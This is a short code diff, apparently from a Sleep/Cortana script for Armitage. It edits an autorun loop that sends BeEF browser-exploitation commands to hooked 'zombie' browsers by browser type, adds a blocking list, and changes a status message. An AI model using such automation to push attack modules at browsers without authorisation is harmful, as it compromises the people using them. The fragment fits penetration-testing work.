+				for ($i = 0; $i < $lim; $i++)   {
+				if ( $browser eq @beef_autorun[$i]["browser"]){
 				$cmdeid = @beef_autorun[$i]["id"];
 				$cmde_param = @beef_autorun[$i]["Param"];
 				send_beefcmd_with_param($sesside, $cmdeid, $cmde_param,0);
-			}
-		}
+				}
+			} push(@autorundisabled, $sesside ) ; } else { println("autorun blocked");}
 	append($console, "\cB (!) BeEF say \"Command not send\", don't pay attention.");	
-	} else { println("No zombie is online at this moment");}	
+	} else { println("Nothing");}	
 }	
